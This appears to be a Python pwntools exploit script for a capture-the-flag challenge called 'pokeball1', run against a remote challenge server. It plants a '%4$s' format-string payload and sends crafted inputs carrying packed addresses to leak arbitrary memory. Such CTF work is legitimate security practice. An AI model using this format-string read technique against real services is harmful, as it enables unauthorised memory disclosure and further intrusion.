from pwn import *
from z3 import *

file = ELF("./pokeball1")
libc = ELF("./arm_libc.so.6")

p = remote("0.cloud.chals.io", 29617)

def store(name, type):
    p.sendlineafter(b">", b"3")
    p.sendlineafter(b":", name)
    p.sendlineafter(b":", type)

def view(payload):
    p.sendlineafter(b">", payload)
    p.recvuntil(b":\n")
    lines = p.recvuntil(b"[*]").split(b"\n")
    return lines

p.sendlineafter(b">", b"1")
print(p.recvuntil(b"Display").decode())

store(b"meh", b"%4$s")

def read(addr, count):
    leak = view(b"1" + b"\x00" * 7 + p32(addr))[1]
    # log.info(f"leak: {leak}")
    leak = leak[leak.index(b"meh ")+4:][:count]
    return leak

print(read(int(input("report: "), 16), -1))

p.interactive()